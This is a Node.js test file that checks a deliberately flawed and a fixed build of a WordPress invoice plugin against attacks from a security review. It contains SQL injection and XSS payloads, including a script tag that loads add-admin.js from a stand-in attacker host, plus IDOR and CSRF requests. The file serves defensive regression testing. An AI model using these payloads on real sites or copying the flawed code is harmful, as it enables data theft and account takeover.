// Each attack from the review report runs against flawed/ (it must work, checked by
// its assertions) and fixed/ (it must be refused). Normal use is in normal-use.test.mjs.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { anonymous, loginAs, form, nonceFor, anyNonce, variant } from './helpers.mjs';

const BOB_IBAN = 'DE89370400440532013000';
const flawed = variant === 'flawed';

test(`1 ${variant}: invoices by id, for a visitor and for another client`, async () => {
  const asVisitor = await (await anonymous('/wp-admin/admin-ajax.php?action=cil_invoice&id=2')).text();
  const alice = await loginAs('alice');
  const asAlice = await alice('/wp-admin/admin-ajax.php?action=cil_invoice&id=2');
  const asAliceText = await asAlice.text();
  if (flawed) {
    assert.ok(asVisitor.includes(BOB_IBAN), 'a visitor reads Bob\'s invoice and IBAN');
    assert.ok(asAliceText.includes(BOB_IBAN), 'Alice reads Bob\'s invoice and IBAN');
  } else {
    assert.ok(!asVisitor.includes(BOB_IBAN));
    assert.equal(asAlice.status, 404);
    assert.ok(!asAliceText.includes(BOB_IBAN));
  }
});

test(`2 ${variant}: a client points the invoice copies at their own address`, async () => {
  const bob = await loginAs('bob');
  const nonce = await nonceFor(bob, 'cil_save_settings');
  const res = await bob('/wp-admin/admin-ajax.php', form({ action: 'cil_save_settings', notify_email: 'bob@attacker.test', _ajax_nonce: nonce }));
  const admin = await loginAs('admin', 'password');
  const page = await (await admin('/wp-admin/admin.php?page=cil-invoices')).text();
  if (flawed) {
    assert.equal(res.status, 200);
    assert.ok(page.includes('bob@attacker.test'), 'the subscriber changed where invoice copies go');
  } else {
    assert.equal(nonce, '', 'subscribers get no settings nonce');
    assert.equal(res.status, 403);
    assert.ok(!page.includes('bob@attacker.test'));
  }
});

test(`2b ${variant}: even with a valid nonce, a subscriber cannot change the settings`, async () => {
  // The nonce comes from a test-only helper: this isolates the capability check.
  const bob = await loginAs('bob');
  const res = await bob('/wp-admin/admin-ajax.php', form({ action: 'cil_save_settings', notify_email: 'bob@attacker.test', _ajax_nonce: await anyNonce(bob, 'cil_save_settings') }));
  const admin = await loginAs('admin', 'password');
  const page = await (await admin('/wp-admin/admin.php?page=cil-invoices')).text();
  if (flawed) {
    assert.ok(page.includes('bob@attacker.test'), 'the subscriber changed where invoice copies go');
  } else {
    assert.equal(res.status, 403);
    assert.match(await res.text(), /forbidden/);
    assert.ok(!page.includes('bob@attacker.test'));
  }
});

test(`3 ${variant}: the lookup endpoint, open and injectable`, async () => {
  const injected = await (await anonymous(`/?rest_route=/cil/v1/lookup&email=${encodeURIComponent("x' OR '1'='1")}`)).text();
  const byEmail = await anonymous(`/?rest_route=/cil/v1/lookup&email=${encodeURIComponent('bob@client-b.test')}`);
  const byEmailText = await byEmail.text();
  if (flawed) {
    assert.ok(injected.includes('INV-ALICE') && injected.includes('INV-BOB'), 'SQL injection lists every invoice');
    assert.ok(byEmailText.includes('INV-BOB'), 'a visitor lists Bob\'s invoices by email');
  } else {
    // Refused before any SQL runs; test 3b shows the query itself is fixed.
    assert.ok(!injected.includes('INV-'));
    assert.equal(byEmail.status, 401);
    assert.ok(!byEmailText.includes('INV-BOB'));
  }
});

test(`3b ${variant}: even for an administrator the email is a value, not SQL`, async () => {
  const admin = await loginAs('admin', 'password');
  const nonce = await admin.restNonce();
  const injected = await (await admin(`/?rest_route=/cil/v1/lookup&email=${encodeURIComponent("x' OR '1'='1")}`, { headers: { 'X-WP-Nonce': nonce } })).json();
  if (flawed) {
    assert.equal(injected.length, 3, 'the injected condition matches every row');
  } else {
    assert.deepEqual(injected, []);
  }
});

test(`4 ${variant}: a client's note runs as script in the administrator's screen`, async () => {
  const alice = await loginAs('alice');
  const nonce = await nonceFor(alice, 'cil_add_note');
  await alice('/wp-admin/admin-ajax.php', form({ action: 'cil_add_note', id: '1', note: 'PO 4471<script src="//attacker.test/add-admin.js"></script>', _ajax_nonce: nonce }));
  const admin = await loginAs('admin', 'password');
  const page = await (await admin('/wp-admin/admin.php?page=cil-invoices')).text();
  assert.ok(page.includes('PO 4471'), 'the note was saved');
  if (flawed) {
    assert.ok(page.includes('<script src="//attacker.test/add-admin.js">'), 'the note is printed as live script');
  } else {
    assert.ok(!page.includes('<script src="//attacker.test/'));
  }
});

test(`4b ${variant}: markup already in the table is printed as text, not run`, async () => {
  // The seeded imported invoice's reference holds an <img onerror>: only escaping on output stops it.
  const admin = await loginAs('admin', 'password');
  const page = await (await admin('/wp-admin/admin.php?page=cil-invoices')).text();
  if (flawed) {
    assert.ok(page.includes('<img src=x onerror=alert(1)>'), 'the stored markup is printed live');
  } else {
    assert.ok(!page.includes('<img src=x onerror'));
    assert.ok(page.includes('INV-&lt;img src=x onerror=alert(1)&gt;'));
  }
});

test(`5 ${variant}: a page on another site makes a signed-in client's browser change a note`, async () => {
  // A cross-site form post carries the client's cookies but cannot read a nonce.
  const alice = await loginAs('alice');
  const res = await alice('/wp-admin/admin-ajax.php', form({ action: 'cil_add_note', id: '1', note: 'Paid already, ignore reminders' }));
  const admin = await loginAs('admin', 'password');
  const page = await (await admin('/wp-admin/admin.php?page=cil-invoices')).text();
  if (flawed) {
    assert.ok(page.includes('Paid already, ignore reminders'), 'the forged request changed the note');
  } else {
    assert.equal(res.status, 403);
    assert.ok(!page.includes('Paid already, ignore reminders'));
  }
});
